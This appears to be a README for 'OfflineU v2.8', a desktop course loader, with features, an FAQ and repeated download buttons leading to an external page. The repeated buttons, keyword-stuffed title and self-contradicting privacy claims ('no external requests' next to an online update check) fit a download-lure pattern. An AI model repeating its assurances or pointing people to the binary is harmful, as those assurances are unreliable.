# OfflineU v2.8 - Course Loader and Update Utility 2026

> **A self-hosted course loader that indexes local folders, displays offline learning material, and records study progress with no internet connection at all.**

[![Loader](https://img.shields.io/badge/Type-Course%20Loader-blue?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Desktop-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/coopernoah1993/offlineu-v2-8-loader?style=flat-square)](https://github.com/coopernoah1993/offlineu-v2-8-loader)

---

<p align="center">
  <a href="https://coopernoah1993.github.io/offlineu-v2-8-loader/">
    <img src="https://img.shields.io/badge/Download-OfflineU%20Loader-brightgreen?style=for-the-badge" alt="Download OfflineU Loader">
  </a>
</p>

> **[Direct Download - OfflineU Loader](https://coopernoah1993.github.io/offlineu-v2-8-loader/)**

---

[Download Latest Build](https://coopernoah1993.github.io/offlineu-v2-8-loader/)

---

## Overview

OfflineU is designed as a personal learning workspace that runs completely on your own computer. It looks through the folders you choose for course assets such as videos, audio tracks, text files, and quizzes, then organizes them into a simple library you can browse with ease. Alongside indexing and local caching, it keeps track of your progress so you can return to the exact point where you stopped, even after closing the app.

This utility is aimed at people who want their study setup to stay private and under their control. There are no accounts, no cloud synchronization, and no outbound data transfers. The update utility helps you stay on the current release while leaving both your course materials and progress data as they are. Whether you are working through documentation, language content, or recorded lectures, OfflineU keeps the material structured and ready to open.

## Loader Features

- **Local course library** - Automatically scans designated folders and builds a searchable catalog of your learning materials
- **Progress tracking** - Remembers your position in videos, audio files, and text documents with resume support
- **Offline content rendering** - Plays videos, displays text, and renders quizzes without any internet connection
- **Content import** - Supports drag-and-drop addition of new course folders or individual files
- **Data portability** - All progress and library data stored in portable files you can backup or transfer
- **Private data store** - No telemetry, no analytics, no external requests; everything stays local
- **Keyboard friendly** - Full navigation and playback controls available without mouse interaction
- **Localization support** - Interface adapts to multiple languages for broader accessibility

## Getting Started

Grab the latest build from the link above and unpack the archive wherever you want to keep it. You can run the executable directly, so there is no installation step.

```bash
# Example: Start OfflineU from terminal
./OfflineU --library ~/Courses
```

At the first launch, select the folder that contains your courses. OfflineU will scan the directory, recognize supported file types, and create the library index on its own. Browse with the arrow keys or the mouse, then press Enter to open any item.

## Update Channels

| Channel | Description | Frequency |
|---------|-------------|-----------|
| Stable | Fully tested releases for daily use | Monthly |
| Beta | Preview builds with latest features | Bi-weekly |
| Nightly | Development builds for testing | Daily |

## Troubleshooting

- **Setup issues** - Ensure your course folders contain supported file types (.mp4, .mp3, .txt, .pdf, .json for quizzes)
- **Permission errors** - On Linux/macOS, make the binary executable with `chmod +x OfflineU`
- **Cache problems** - Delete the `.offlineu_cache` folder in your home directory to force a fresh scan
- **Network issues** - This loader works fully offline; no internet connection is required or used

## FAQ

**How does the update process work?**  
On startup, the loader checks the release page for newer versions. If an update is available, you confirm the action before it is downloaded and installed. Your course files and progress information are not changed during the process.

**Where are my local files stored?**  
Library metadata and progress data live in `~/.offlineu/` on Linux/macOS or `%APPDATA%\OfflineU\` on Windows. Course content stays in your original folders.

**Can I roll back to an older version?**  
Yes. Previous releases remain available on the download page. Simply replace the executable with the older version—your data remains compatible.

**Does OfflineU collect logs?**  
Local logs are written to the data directory for troubleshooting purposes. No logs are transmitted anywhere.

**What platforms are supported?**  
The loader runs on Windows, macOS, and Linux. A 64-bit processor and 1GB of RAM are recommended.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
